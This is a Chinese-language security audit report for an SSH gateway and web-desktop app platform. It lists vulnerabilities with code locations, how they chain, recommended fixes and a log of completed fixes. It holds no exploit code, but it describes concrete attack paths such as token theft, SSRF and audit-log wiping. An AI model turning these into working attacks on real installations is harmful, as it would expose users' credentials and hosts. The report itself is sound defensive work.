### 凭据与 SSH

**QX-021 首次连接静默 TOFU，无指纹展示/用户确认** ｜ CWE-295 ｜ 已确认 ｜ CRED-04
[hostkeys.go:87-91](<internal/sshpool/hostkeys.go#L87>)：首连自动信任并记录，不导入 OpenSSH known_hosts。首连即处 MITM 窗口的用户无任何提示；放大 QX-002/QX-020。修复：首次信任前展示 SHA256 指纹并要求确认（或严格模式开关）；首信事件入审计。

**QX-022 SSH 算法集未限定，默认接受 SHA-1 KEX/MAC 与 ssh-rsa/ssh-dss 主机键** ｜ CWE-327 ｜ 已确认（对照 x/crypto v0.57.0 源码核实）｜ CRED-05
[pool.go:168-174](<internal/sshpool/pool.go#L168>)：ClientConfig 无 Config/HostKeyAlgorithms，库默认含 dh-group14-sha1、hmac-sha1/-96、ssh-rsa(SHA1)、ssh-dss。主动 MITM 可降级协商；DSA 主机键与 QX-020 叠加尤其危险。修复：显式现代算法白名单（curve25519/ecdh、chacha20/aes-gcm/ctr、etm MAC、ed25519/ecdsa/rsa-sha2）。

**QX-023 data.db 未收紧文件权限，Windows 模式位无效** ｜ CWE-732 ｜ 部分疑似（运行时模式依赖 umask/平台）｜ CRED-06
[db.go:143-178](<internal/config/db.go#L143>)：无 Chmod/ACL；SQLite 默认 0666&umask；唯一屏障是目录 0700（MkdirAll 不修正已存在目录）。与 QX-004 叠加：文件可读=全部凭据。修复：显式 0600 + 目录权限校验修正；Windows 用 ACL API（go-winio 已在间接依赖）。

**QX-024 刷新令牌明文存库（30 天 TTL）** ｜ CWE-312/522 ｜ 已确认 ｜ CRED-08 = AUTH-11
[config.go:1246-1281](<internal/config/config.go#L1246>)：app_refresh 表存原文，读库即可在寿命内冒充对应应用。轮换+重放检测设计良好但防不住读库直取。修复：存 SHA-256(token) 哈希。

**QX-025 hosts/test 未豁免请求体审计，明文凭据可入 verbose 审计** ｜ CWE-532 ｜ 已确认 ｜ CRED-09 = EXEC-11
[api.go:173](<internal/httpapi/api.go#L173>) 用 sysPerm 而非 sysNoBody（对照 create/import/update 均豁免）：请求体 password/keyData/keyPassphrase 原文入审计。修复：改 sysSecret/sysNoBody。

### 执行与审计

**QX-030 job 端点不校验归属，job:output（Danger 1）可读宿主/其他应用作业输出与 argv** ｜ CWE-863 ｜ 已确认 ｜ EXEC-04
[jobs.go:210-370](<internal/httpapi/jobs.go#L210>)：status/output/kill/list/remove 均不查 meta.App。修复：按 callerApp 过滤/校验归属（宿主除外）。

**QX-031 WS 执行永不进 verbose 审计，命令审计存在缺口** ｜ CWE-778 ｜ 已确认 ｜ EXEC-05
[sys.go:159](<internal/httpapi/sys.go#L159>)（`!ws` 排除）+ verbose 默认关：exec/session 的 argv 即使开 verbose 也不记录；交互式命令不可追溯。修复：WS 会话建立时记录 argv/主机/调用者到审计（非 verbose 也记）。

**QX-032 peekHostID 取 query 优先，审计主机归属可欺骗** ｜ CWE-778 ｜ 已确认 ｜ EXEC-06
[hostpeek.go:13,47-76](<internal/httpapi/hostpeek.go#L13>)：正则匹配首个 "host"，调用者可把操作挂到任意主机工作区（非授权绕过，反取证面）。修复：归属取自请求体/验签上下文，query 仅兜底。

**QX-033 sudo 密码 stdin 前置，sudo 不消费时透传给命令回显** ｜ CWE-200 ｜ 疑似（需运行时验证）｜ EXEC-07
[exec.go:249](<internal/httpapi/exec.go#L249>) + [terminal.go:166-207](<internal/httpapi/terminal.go#L166>)：per-command NOPASSWD/timestamp 有效时 sudo 不读 stdin，密码流入命令 stdin 可能被回显；elevated WS 的 ECHO=1 PTY 存在回显竞态。修复：先探测 sudo 是否需要密码（sudo -n -v）再决定注入；PTY 先关 ECHO。

**QX-034 term/exec WS 无读写超时/心跳，本地 exec WS 无时限** ｜ CWE-400 ｜ 已确认 ｜ EXEC-08
[execws.go:40](<internal/httpapi/execws.go#L40>)（context.Background()）、[terminal.go:227-249](<internal/httpapi/terminal.go#L227>)：64 条半开连接即耗尽 wsSlots，进程/会话泄漏。修复：ReadDeadline+心跳、空闲超时、本地 exec 上下文时限。

**QX-039 审计反取证：clear/archive/改配置不入审计痕迹，队列溢出弹旧塞新** ｜ CWE-778 ｜ 已确认 ｜ APP-08
[auditstore.go:315](<internal/httpapi/auditstore.go#L315>)、[auditstore.go:201](<internal/httpapi/auditstore.go#L201>)：持 logs:clear 的应用可无痕清空；保留策略可缩至 64KB+delete；洪泛可挤掉真实记录。修复：审计管理操作本身强制入独立系统审计；清档保留摘要存根。

**QX-040 审计存于 logs 应用 storage 命名空间，归档读回无条件信任** ｜ CWE-345 ｜ 设计已确认/利用疑似 ｜ APP-09
审计目录在 appdata/logs 下（[audit.go:96-106](<internal/httpapi/audit.go#L96>)）：logs 应用被攻破（持 storage:write）即可直接篡改/伪造审计文件与归档。修复：审计存储移出应用可写命名空间；归档加完整性校验（签名/HMAC）。

### 文件与网络

**QX-035 webproxy 目标/重定向无地址过滤 + TLS InsecureSkipVerify 恒真** ｜ CWE-918/295 ｜ 已确认 ｜ NET-06
[proxy.go:284,399-469,583-617,387](<internal/proxy/proxy.go#L284>)：可打云元数据/远端回环；probeUpgrade 启动即预跟随 5 跳；上游 TLS 证书不校验。修复：目标地址策略（禁元数据/内网段可配置）、重定向同策略、恢复证书校验。

**QX-036 localfs 无根限制且不自保护配置目录** ｜ CWE-22/284 ｜ 已确认（设计缺陷）｜ NET-07
[appstore.go:387-572](<internal/httpapi/appstore.go#L387>)：local:read 可读 keys/private.pem+data.db 升级宿主全量（链 A 的授权版）；local:write 可改其他应用代码/写 .qx-source；local:delete 无根保护。修复：配置目录/密钥路径自保护黑名单；localfs 可配置根目录；Danger 3 授权逐次确认。

**QX-037 SFTP 上传无总量限制** ｜ CWE-400 ｜ 已确认 ｜ NET-10
[sftp.go:768,802](<internal/httpapi/sftp.go#L768>)：ParseMultipartForm 64MB 仅内存阈值，磁盘临时文件无上限 → 宿主临时盘写满。修复：http.MaxBytesReader + 总量上限。

**QX-038 SFTP copy/move 自嵌套无限递归；rm 递归顶层 Stat 跟随符号链接** ｜ CWE-674/59 ｜ 递归已确认/崩溃疑似 ｜ NET-11
[sftp.go:694-726](<internal/httpapi/sftp.go#L694>)（/a→/a/b 无限递归 → 网关栈溢出+远端磁盘写满）、[sftp.go:543-561](<internal/httpapi/sftp.go#L543>)（rm 删符号链接目标内容）。修复：目标前缀校验拒绝自嵌套；lstat 处理符号链接。

### 应用安装链

**QX-041 zip 炸弹：单文件上限查声明值、io.Copy 无限制、总量检查在写后** ｜ CWE-400 ｜ 已确认 ｜ APP-10
[apps.go:816-842](<internal/httpapi/apps.go#L816>)：UncompressedSize64 可谎报，实际解压无 LimitReader，磁盘填充后才中止。修复：io.LimitReader 按声明值+硬上限双重限制，边写边计量。

**QX-042 git 安装允许 file://（读本地仓库）与 git:///ssh:///http://（内网 SSRF）** ｜ CWE-918 ｜ 协议面已确认 ｜ APP-11
appgit.go URL 消毒未限制协议白名单。修复：仅允许 https（+显式配置的 ssh），禁 file://；主机地址策略。

**QX-043 git 缓存位于共享 /tmp、名字可预测、TTL 内无条件复用** ｜ CWE-377/426 ｜ 设计已确认/竞态疑似 ｜ APP-12
本地攻击者可在缓存窗口内投毒克隆内容（随后被安装）。修复：缓存放配置目录 0700 下；复用前校验仓库哈希/签名。

### 前端与桥接

**QX-044 browser 内嵌 iframe 沙箱含 allow-same-origin+allow-scripts+弹窗逃逸，代理剥离上游 CSP** ｜ CWE-693/1021 ｜ 配置已确认/链疑似 ｜ APP-14 = FE-04
[browser/app.js:38-42](<internal/webui/apps/browser/app.js#L38>) + [proxy.go:517](<internal/proxy/proxy.go#L517>)：远程页可在用户激活下整页导航宿主（全屏钓鱼）、开无沙箱弹窗；两全权限沙箱标志同开使远程页可访问代理源存储。修复：去掉 allow-same-origin/allow-popups-to-escape-sandbox/allow-top-navigation-by-user-activation；保留上游 CSP。

**QX-045 vdom innerHTML 无 sanitizer + components 多处 raw label 插值** ｜ CWE-79 ｜ 已确认（动态流：browserLabel）｜ FE-05 = APP-17
[vdom.js:499](<internal/webui/assets/js/core/vdom.js#L499>)、[components.js:78,250,637,1055,1164,1382](<internal/webui/assets/js/core/components.js#L78>)：当前唯一确认的动态不可信流是 browserLabel（本机浏览器注册表/版本元数据）→ 宿主菜单 XSS（结合 QX-003/019 = 宿主接管）；其余调用方已逐一核对为静态/已转义。修复：vdom 默认文本化，innerHTML 需显式标记+sanitizer；label 一律 esc。

**QX-046 桥 set-pref 无键白名单无权限，任意应用持久篡改全局偏好** ｜ CWE-862 ｜ 已确认 ｜ FE-06
[appframe.js:779-794](<internal/webui/assets/js/wm/appframe.js#L779>)：以 hostTok 落库，可改壁纸/文件夹/布局（UI 篡改/钓鱼；已核实偏好消费点无 XSS）。修复：键白名单 + ui:settings 权限。

**QX-047 injectSession 只判 Sec-Fetch-Mode 未判 Dest，沙箱应用可自导航宿主页造"套娃宿主"** ｜ CWE-200 ｜ 已确认 ｜ FE-07
[api.go:292-307](<internal/httpapi/api.go#L292>)：iframe 加载宿主页也注入 hostTok，扩大暴露面（与 QX-003/005 同根）。修复：校验 Sec-Fetch-Dest=document + Host 可信 + 顶层导航。

**QX-048 appkit SDK 提供危险命令拼接 API（双引号内 $() 可执行）** ｜ CWE-78 ｜ 已确认（无第一方调用方）｜ FE-08
[appkit.js:1388,1410,1510,1647,1671,943](<internal/webui/assets/js/core/appkit.js#L1388>)：testPort/dnsResolve/pkgInstalled/archiveExtract/archiveCreate/killProcess 把参数插进双引号 shell 串，`$( )`/反引号未处理；sudo:auto 可提 root。面向第三方应用的危险默认 API。修复：参数白名单/转义或改 argv 直传；移除 sudo:auto 默认。

**QX-049 tunnels.create 接受 hostId 覆盖，或可跨主机建隧道** ｜ CWE-863 ｜ 疑似（待后端权限语义确认）｜ FE-09
[tunnels/app.js:247,260](<internal/webui/apps/tunnels/app.js#L247>)。修复：后端按调用者权限校验 hostId（结合 QX-026）。

---

## 六、Low 级发现（24 项）

| 编号 | 标题 | 位置 | 来源 | 置信度 |
|---|---|---|---|---|
| QX-050 | 后台执行 argv 全量写 Info 日志，命令行敏感参数泄露 | [exec.go:624](<internal/httpapi/exec.go#L624>) | CRED-10 | 已确认 |
| QX-051 | 凭据类响应缺 Cache-Control: no-store（secret/get 为 GET） | [respond.go:29-32](<internal/httpapi/respond.go#L29>) | CRED-12 | 已确认 |
| QX-052 | known_hosts 固定 .tmp 名+写失败静默，多实例竞争丢信任记录→重新 TOFU | [hostkeys.go:114-133](<internal/sshpool/hostkeys.go#L114>) | CRED-13 | 已确认 |
| QX-053 | jti 吊销名单仅内存，重启后单枚吊销失效（≤30min 窗口） | [api.go:52-54](<internal/httpapi/api.go#L52>)、idp.go:668-686 | AUTH-08 | 已确认 |
| QX-054 | 吊销单枚 access 不吊销配套 refresh，可立即换发复活 | idp.go:713-732 | AUTH-09 | 已确认 |
| QX-055 | "本次允许"extraScopes 随 refresh 续命 30 天且授权表不可见 | idp.go:604-657,837-854 | AUTH-10 = NET-17 | 已确认 |
| QX-056 | 缺 CSP/frame-ancestors/CORP/COOP/COEP（QX-013/019 的兜底缺失） | [api.go:458-466](<internal/httpapi/api.go#L458>) | AUTH-12 = FE-15 | 已确认 |
| QX-057 | -auth-token 命令行可见（ps）+ 子进程继承 env | [main.go:86-92](<main.go#L86>) | AUTH-14 | 已确认 |
| QX-058 | 令牌可走 ?token=/?session=（历史/代理/日志泄露面）；qx_token 无 Secure；无失败限速 | [api.go:376-391](<internal/httpapi/api.go#L376>)、sys.go:360-366 | AUTH-15 = NET-15 = FE-12 | 已确认 |
| QX-059 | writeErr 直传 err.Error() 泄露绝对路径/远端原始输出 | [respond.go:34-38](<internal/httpapi/respond.go#L34>)、apps.go:1027 | AUTH-16 | 已确认 |
| QX-060 | 桥 perm-changed/session-revoked-notify 接受任意 d.app → 跨应用清会话/重载（DoS） | [appframe.js:137-149,658-663](<internal/webui/assets/js/wm/appframe.js#L137>) | AUTH-18 = FE-11 | 已确认 |
| QX-061 | epoch 递增失败仅告警，撤销接口仍返回 OK（撤销可能未生效） | idp.go:690-697 | AUTH-19 | 已确认 |
| QX-062 | net/http 可伪造 Sec-Fetch-Mode 向自身套取 hostTok（需 net:http 权限） | [netbridge.go:239-249](<internal/httpapi/netbridge.go#L239>) | NET-13 | 已确认 |
| QX-063 | UDP peers/SOCKS pipes/实例数无上限、SOCKS 无认证、转发无空闲超时 | udp.go:394-421、socksudp.go:269-299、tunnel.go:358-442 | NET-14 | 已确认 |
| QX-064 | HTTP server 无 Read/WriteTimeout（网关与 webproxy）→ slowloris | [bootstrap.go:72-77](<internal/bootstrap/bootstrap.go#L72>)、proxy.go:302 | NET-16 = AUTH-21 | 已确认 |
| QX-065 | storage resolveNoSymlink TOCTOU；localfs/write 超限先截断后删除原文件 | appstore.go:58-92,500-517 | NET-18 = APP-16 | 已确认/疑似 |
| QX-066 | bgProc.kill 锁外 FindProcess PID 复用误杀竞态；无进程组，kill 留孤儿孙进程 | exec.go:564-573 | EXEC-09 | 已确认 |
| QX-067 | bgProcs 无创建者字段、id 顺序可枚举，跨应用读/杀宿主后台进程 | exec.go:138-174,515-527 | EXEC-10 | 已确认 |
| QX-068 | 远端 job out.log 无上限/轮转，job:run 可写满远端磁盘 | jobs.go:75-85 | EXEC-12 | 已确认 |
| QX-069 | sudo/request 无速率限制，可在线爆破远端 sudo 密码 | sudoauth.go:60-141 | EXEC-13 | 已确认 |
| QX-070 | cleanGitBranch 把 `\x00-\x1f` 当字面字符集，控制字符漏检 | [appgit.go:116](<internal/httpapi/appgit.go#L116>) | APP-15 | 已确认 |
| QX-071 | init 向每个应用下发全部宿主 prefs（信息过度暴露） | appframe.js:851,867 | FE-13 | 已确认 |
| QX-072 | browser-core JSON.stringify 进 sh 双引号（$/反引号未处理，当前仅静态输入） | browser-core.js:634 | FE-14 | 已确认 |
| QX-073 | vdom 字符串型 on* prop 落成内联 handler、style 走 cssText；toast kind 类名注入（潜在） | vdom.js | FE-17 | 已确认 |

## 七、Info 级发现（7 项）

| 编号 | 标题 | 位置 | 来源 |
|---|---|---|---|
| QX-074 | encrypt/decrypt 失败静默返回空串，凭据无声丢失/损坏不可辨（健壮性） | config.go:209-238 | CRED-14 |
| QX-075 | pub 端点+JWKS 任意网站可跨源读取（版本/权限目录侦察面） | api.go:151-165,238 | AUTH-20 |
| QX-076 | deny 名单仅 refresh 路径清理；refresh 审计类型误用 revoke | idp.go:810,860-866 | AUTH-22 |
| QX-077 | audit/note HostID 自报可挂任意工作区；User 恒 "admin"（单用户设计注记） | audit.go:480+ | APP-18 |
| QX-078 | webproxy XFF 恒置 127.0.0.1 绕过上游 IP 白名单；tar 条目名可构造 ../（tar-slip）；上传文件名未拒反斜杠（Windows 远端）；apps/file 审计无调用者 | proxy.go:496 等 | NET-19 |
| QX-079 | 依赖很新（x/crypto 0.57.0、websocket 1.5.3、go-git 5.19.3、x/net 0.58.0、sqlite 1.60.0），无已确认 CVE 命中；前端 vendor uPlot 1.6.32，xterm.js/lucide bundle 无版本标记需人工核对；建议运行 govulncheck（本机未安装） | go.mod | APP-19 = FE-16 |
| QX-080 | 设计边界注记：回环免鉴权下任意本机进程一条伪造 Sec-Fetch-Mode 的请求即得 hostTok（同用户进程本就在信任边界内，但应文档化；QX-005/017 修复后收敛） | api.go:289-309 | AUTH-13 = EXEC-14 |

---

## 八、已检查且无问题的关键面（良好设计，避免误报）

汇总自 6 份专项报告的"无问题"清单（去重）：

1. **JWT 实现扎实**：RS256 强制白名单、无 alg 混淆/none 攻击；kid 仅 map 查找无路径遍历；iss/aud/exp/iat 全校验；epoch 世代 + jti 吊销 + 刷新轮换重用检测体系健全。
2. **零默认权限属实**：permCatalog 全部 Default=false；PermNormalize 无通配放大；tokenAllows 精确匹配；路由注册强制校验权限键存在。
3. **随机数**：全仓库无 math/rand；randTok/NewID/主密钥/IdP 密钥均 crypto/rand 且失败 panic。
4. **SQL 注入**：全部语句参数化（含 LIKE/LIMIT），无拼接。
5. **主机键校验**：无 InsecureIgnoreHostKey；所有拨号路径统一走 knownHosts 回调；同算法密钥变更会被拒绝（告警文案含新旧指纹）。
6. **命令注入**：shellQuote 为标准 POSIX 单引号逃逸，后端全部拼接点覆盖；本机 exec 无 shell 包装；sudo 密码走 stdin 不进 argv/ps/日志；osdetect/UDP 中继探测命令固定/已转义。
7. **对称加密算法**：AES-256-GCM + 每次随机 12 字节 nonce，无复用（问题仅在密钥存放，QX-004）。
8. **secret 隔离**：callerApp 取自验签 JWT，secret/storage/prefs-self 按 app_id 严格隔离，应用 A 读不到应用 B。
9. **hosts/list 不回传凭据**：仅 HasPassword/HasKey 布尔；错误信息不含凭据。
10. **Zip Slip/git 命令注入**：zip 路径穿越被有效阻断；git 参数经消毒无 shell 拼接；manifest 无法伪装 SystemApp/指向宿主页入口。
11. **宿主页面渲染**：manifest 名称/描述/图标全走 textContent+encodeURIComponent；文件名/日志/进程名/主机名等远程数据均转义；injectSession 上下文不可被应用数据污染；无 eval/document.write/srcdoc。
12. **postMessage 接收侧**：宿主 onMessage 用 e.source 反查已挂载帧（比 origin 校验更严）；应用侧只认 window.parent；应用帧沙箱无 allow-same-origin/顶层导航/弹窗逃逸（问题在发送侧 load 推送，QX-003）。
13. **CSRF**：Cookie HttpOnly+SameSite=Strict，CORS 无 Allow-Credentials，经典跨站请求伪造不成立；WS 有 Origin 校验+令牌门禁兜底（CSWSH 不可直接利用）。
14. **资源控制（部分）**：WS ReadLimit 1MB、wsSlots 全路径覆盖；输出缓冲硬上限；SSH 拨号/握手/keepalive 超时齐全；跳板链深度≤5+环检测；并发拨号去重。
15. **文件权限（除 data.db）**：配置目录 0700、known_hosts/日志/审计/IdP 私钥/应用私有存储 0600。
16. **日志脱敏**：敏感 kv 键统一掩码；日志文件 0600+轮转保持。
17. **其他**：SFTP Content-Disposition %q 防注入；net/http 重定向/body/头限制；local/dynamic/UDP 隧道回环绑定；SOCKS UDP 无外部反射；safeJoin 正确处理 Windows 盘符/UNC/大小写；apps/file 的 `..`/双重编码防护有效；prefs 有大小限制；审计 JSONL 无行注入、归档无解压穿越；localStorage 无令牌。

## 九、修复优先级路线图

### P0（立即，阻断 Critical/High 链）
1. **统一 Host/来源门禁**：Host 白名单中间件；injectSession 校验 Host+Sec-Fetch-Dest=document；（修 QX-005/017/047/062/080 整族）
2. **安装包保留名**：`.qx-*` 拒包；appRoot 重定向仅开发模式+白名单；apps/file 纳入鉴权+启用状态检查+未知扩展拒绝（QX-001/012/015）
3. **hosts/test 禁止覆盖已存主机 Address/Port/User/KeyPath**（QX-002）
4. **桥令牌改主动握手**，load 不再无条件推送；内置应用 JWT 最小 scope（QX-003/019）
5. **实时审计认证头脱敏**（复用 sanitizeVerbose）；hostTok 可轮换/吊销/有效期（QX-006）
6. **schedule/create+run 复核 execPermNeed**；elevated 独立权限门禁+sudo 缓存按应用隔离（QX-008/009）
7. **安装权限逐项同意**；覆盖安装吊销令牌+清旧授权（QX-010/011）
8. **IdP 归档只留公钥**+旧 kid 宽限期（QX-007）
9. **api-return 补 call.to 校验**；workspace.info/set-pref/apps.reload 补权限（QX-018/027/046/060）

### P1（近期版本）
- 主密钥移出 data.db（OS 密钥链/口令派生）；refresh 存哈希；data.db 显式 0600/ACL（QX-004/023/024）
- known_hosts 按主机信任+首信指纹确认+算法白名单（QX-020/021/022）
- perm:grant 仅宿主；按主机授权维度；job 归属校验（QX-028/026/030）
- localfs 配置目录自保护+可配根；webproxy 鉴权+目标过滤+保留安全头；remote 隧道地址策略（QX-036/016/035/017）
- git 安装拒符号链接+协议白名单+缓存入私有目录；包下载 https+校验和（QX-012/042/043/014）
- 全网关 CSP+应用文件 sandbox CSP；vdom 默认文本化（QX-013/056/045）
- WS 超时/心跳；上传总量限制；copy/move 自嵌套拒绝（QX-034/037/038）

### P2（加固迭代）
- 审计管理操作入独立系统审计+归档完整性；审计存储移出 logs 命名空间（QX-039/040）
- 令牌离开 URL（改头/一次性 code）；失败限速；server 超时；no-store（QX-058/064/051）
- 其余 Low/Info 按表逐项处理；运行 govulncheck 与前端 vendor CVE 核对（QX-079）

## 十、方法论与局限

- **静态审计**：全部结论基于源码逻辑推导与跨文件求证；Critical/High 关键链由汇总人逐条复核代码证据。未运行程序、未做动态 PoC——标注"疑似"的条目（QX-033/043/049 及浏览器 PNA 相关）建议在测试环境复现确认。
- **严重级别口径**：Critical=可闭环推导的完全接管/全量凭据泄露且前置条件低；High=完全接管但需特定前置（用户交互/特定浏览器/特定授权）或局部严重越权；Medium=有限越权/信息泄露/DoS/设计缺陷；Low=加固项；Info=注记。个别条目汇总定级与专项不同处已注明理由（QX-004）。
- **去重规则**：同一缺陷被多专项独立发现的合并为一条并列出全部来源编号（如 QX-002=CRED-02=EXEC-03），交叉印证提高置信度。
- **依赖扫描局限**：govulncheck 未安装未能运行；依赖版本经人工核对无已知 CVE 命中，但不排除未公开/新披露漏洞。
- 各专项的完整证据摘录、逐条攻击链推导与"无问题"核查明细见 audit-work/ 下六份报告。

---

## 十一、修复进度日志（security-fixes 分支）

> 本节随修复推进更新。修复均在 `security-fixes` 分支提交，每批经 `go build`/`go vet`（前端经 Node 语法校验）验证。

### 已修复（截至 2026-11-19 第 6 轮，P0 全部完成，P1 大部完成）

**第 1 轮**

| 发现 | 修复内容 | 提交 |
|---|---|---|
| QX-001a | parseAppZip 拒绝 `.qx-*` 保留元数据条目（与 git 路径对齐） | 1be0891 |
| QX-001b | appRoot 重定向目标必须为合法应用目录（manifest 校验 + id 匹配） | 0112833 |
| QX-002 | hosts/test 禁止覆盖已存主机地址/端口/用户/密钥路径/跳板 | 1be0891 |
| QX-005 | withHostGuard：免鉴权部署 Host 限回环/localhost（抗 DNS rebinding） | 0112833 |
| QX-006 | 实时审计捕获阶段脱敏认证头/查询/请求体；删除被替代的 redactSessionInQuery | 1be0891 |
| QX-007 | IdP 轮换只归档公钥；旧私钥归档启动时迁移为公钥并销毁私钥文件 | 1be0891 |
| QX-008 | elevated exec/sftp/attrs 要求 sudo:request；sudo 缓存按调用方分桶隔离 | 0112833 |
| QX-009 | schedule create/update/run 复核 execPermNeed（与 fireSchedule 对齐） | 1be0891 |
| QX-011 | zip/git 覆盖安装与重新 link 吊销旧令牌、清空旧授权 | b58376e |
| QX-012 | git 安装拒绝符号链接条目（fail-closed） | b58376e |
| QX-015p | appFileTypes 白名单按注释落地：未知扩展名 404（含嵌入 FS 路径） | 1be0891 |
| QX-018 | 桥 api-return 补 call.to === entry 校验 | 689934e |
| QX-025 | hosts/test 注册改 sysNoBody | 1be0891 |
| QX-028 | perm/grant|revoke|clear 仅限宿主与内置应用 | b58376e |
| QX-047 | injectSession 增加 Sec-Fetch-Dest=document 条件 | 0112833 |
| 注释修正 | apps.go 白名单注释与实现一致、idp.go 归档注释、main.go 轮换提示、hosts.go test 文档 | 1be0891 |

**第 2 轮**

| 发现 | 修复内容 | 提交 |
|---|---|---|
| **QX-003（Critical）** | 每帧握手密钥经 URL fragment 下发；init/令牌仅在携带密钥的 ready 握手后投递；移除 iframe load 无条件推送（被动导航不再收到令牌）；两处重载路径重置 ready 允许重新握手 | 996d42f |
| QX-027 | workspace.info 桥方法要求 hosts:read | 996d42f |
| QX-046 | set-pref 要求 ui:settings | 996d42f |
| QX-060 | perm-changed/session-revoked-notify 跨应用目标仅限内置应用；apps.reload 仅限内置 | 996d42f |
| QX-020 | known_hosts 信任改为按主机地址的密钥集合；任何未记录公钥（含换算法）一律拒绝；已知主机优先提议已记录算法防误拒；告警区分新旧算法 | d35a87d |
| QX-022 | 显式现代 KEX/Ciphers/MACs/HostKeyAlgorithms 白名单（剔除 SHA-1 KEX/MAC、ssh-rsa/ssh-dss 新主机） | d35a87d |
| QX-052 | known_hosts 随机后缀临时文件 + 原子改名 | d35a87d |
| QX-074 | encrypt/decrypt 返回 error 并向上传播（Create/UpdateHost、SecretSet）；GetHost/SecretGet 解密失败经 SetWarnFn 钩子接入日志——消除语义层面的"空实现"错误路径 | a1d3c5c |
| QX-042 | git 协议白名单仅 https + ssh（禁 http/git:///file://） | 284f25f |
| QX-014 | 应用包下载强制 https；重定向 ≤5 跳且目标必须 https | 284f25f |
| QX-070 | cleanGitBranch 控制字符按范围判断（原 ContainsAny 字面集漏检）+ 禁反斜杠 | 284f25f |
| 注释修正 | appframe.js post() 安全模型注释、appgit.go 传输协议注释、downloadAppZip/cleanGitURL 文档 | 996d42f/284f25f |

**QX-003 残留注记**：用户点击授权弹窗"允许"后的令牌推送与 perm-changed 重签推送仍以帧当前文档为目标（需用户交互或恶意代码主动触发，且恶意代码本可直接外带自有令牌）；根本收敛依赖 QX-019 内置应用最小 scope（已于第 3 轮完成）。第三方应用协议变更：不再无条件收到 init，须使用 app-bridge SDK 的带密钥 ready 握手（示例应用已自动适配）。

**第 3 轮**

| 发现 | 修复内容 | 提交 |
|---|---|---|
| **QX-019（High）** | 内置应用最小权限化三处同改：appScope 按 manifest 声明签发（不再全量 permIDs）；permAllowed 对内置应用按声明集判定；桥 requirePermission/api-call/跨应用分派取消 system  blanket 豁免改查 manifest。11 个 manifest 依据逐调用点盘点（audit-work/builtin-scopes.md）补齐缺失键（files 的 sudo、taskmon/systemd 的 local:exec、hosts 的 forgetos、browser/tunnels 的 preconnect、prefs:self 读写对等），移除 browser exec:run/local:read 与 hosts hosts:credential 三个危险冗余键 | 5f1e720 |
| **QX-010（High）** | 安装同意门禁：grantOnInstall 按 Danger 分级——≤1 随安装授予，≥2 仅授予用户确认页展示的 consent 清单内的项，其余延迟到运行时逐项弹窗请求并返回 deferredPermissions 提示；store 四条安装路径接线 consent；desktop 快捷安装无 consent → 高危自动延迟（安全默认）；审计记录 granted/deferred | 4965c15 |
| 注释修正 | handleInstallApp 文档不再称"声明即预授权"；appScope 注释同步 | 4965c15/5f1e720 |

**QX-019 保守决策注记**：仅移除三个最危险冗余键，其余盘点出的冗余键（多为 Danger 1）暂保留——无运行时 UI 测试条件，避免静默功能回归；后续可经运行时验证再收紧。systemd 补 local:exec 覆盖空主机边缘路径。

**第 4 轮**

| 发现 | 修复内容 | 提交 |
|---|---|---|
| **QX-015（High，完整）** | apps/file 路由改为 `/{id}/{tok}/{path...}` 能力路径：每应用随机令牌（内存态、每次启动重生成）常量时间校验；令牌仅经 apps/list 的 fileToken 字段发放给宿主/内置应用（第三方持 apps:list 也拿不到）；前端令牌表由 desktop appsloader 与 store 注入，图标无令牌回退默认；子资源相对路径自动继承令牌段；未鉴权跨应用/跨站读取 404；审计移到令牌校验之后（消除未认证归属伪造） | edf050b |
| **QX-013（High）** | 应用 HTML/SVG 响应附加与 iframe 沙箱标志一致的 `Content-Security-Policy: sandbox`：诱导顶层导航到应用内容仍在沙箱（不透明源）运行，读不到宿主注入令牌。内置 `/apps/` 嵌入 FS 路由为可信第一方静态内容，维持原状 | edf050b |

**协议变更注记（QX-015）**：第三方应用自身资源用相对路径不受影响；宿主桌面/store 经 apps/list 自动取令牌。旧格式 URL（无令牌段）一律 404。内置应用走 `/apps/` 嵌入路由不受影响。

**第 5 轮**

| 发现 | 修复内容 | 提交 |
|---|---|---|
| QX-036（Medium） | localfs 全操作（list/read/write/delete/mkdir/rename 含 rename 目标）拒绝配置目录内路径（凭据库/密钥/应用代码/审计）；符号链接解析 + Windows 大小写折叠防绕过 | f7fd93c |
| QX-065（Low） | localfs/write 改临时文件 + 原子替换：超限/失败不再先截断毁掉原文件 | f7fd93c |
| QX-017（High） | remote 隧道 bind 与 local/dynamic 一致默认仅回环，杜绝把宿主侧服务裸暴露到远端网段 | f7fd93c |
| QX-016（High，部分） | webproxy 监听校验 Host 仅回环（抗 rebinding）；包文档同步。残留：本机进程仍可直接使用代理（与网关回环信任边界一致），能力路径前缀为后续项；XFO/CSP 剥离与 Cookie 串扰维持现状（浏览器应用功能依赖，需独立设计） | 5af8de4 |
| QX-035（Medium） | 两处 Transport 移除 InsecureSkipVerify（上游证书正常校验，自签名上游将失败——安全默认）；Start 目标与 probeUpgrade 重定向枢轴禁止链路本地/云元数据字面量地址 | 5af8de4 |
| QX-064（Low，部分） | webproxy http.Server 补 ReadHeaderTimeout/IdleTimeout（网关侧待补） | 5af8de4 |
| QX-023（Medium） | data.db/-wal/-shm 显式 chmod 0600；配置目录显式 chmod 0700（MkdirAll 不修正已存在目录）。Windows ACL 加固为后续项 | 829e387 |
| QX-024（Medium） | 刷新令牌以 SHA-256 哈希落库（Save/Get/Revoke/Rotate 边界转换）；GetRefresh 对旧明文行懒迁移；读库不再等于可用凭据 | 829e387 |

**第 6 轮**

| 发现 | 修复内容 | 提交 |
|---|---|---|
| QX-030（Medium） | job status/output/kill/remove 校验 meta.App 归属（宿主豁免）；list 按调用者过滤；归属本地缓存 + 远端 meta 懒加载；startJob 记录归属 | cd2d82a |
| QX-041（Medium） | zip 解压双重限流（声明值 + 剩余总预算，+1 探测字节），超限即中止；失败清理半解压目录 | cd2d82a |
| QX-043（Medium） | git 克隆缓存从共享 /tmp 迁入 configDir/git-cache（0700），杜绝跨用户投毒 | cd2d82a |
| QX-064（Low，完成） | 网关 ReadHeaderTimeout 防慢速攻击；注释说明不设 ReadTimeout（大上传）/WriteTimeout（WS/流式）的理由 | cd2d82a |
| QX-037（Medium） | SFTP 上传请求体 MaxBytesReader + 远端写入 LimitReader 双硬限（512MB）；超限删除远端半成品 | 4af6de2 |
| QX-038（Medium） | copy/move 拒绝自嵌套目标；copyPath 深度上限 64（符号链接环）；removeRecursive 改 Lstat（删链接本身不删目标内容） | 4af6de2 |

### 空实现盘点结论

- Go 层 634 个函数声明：**0 个未使用函数、0 个空函数体、0 个零值占位返回、0 个仅注释函数体**（脚本全量扫描 + 人工复核）。
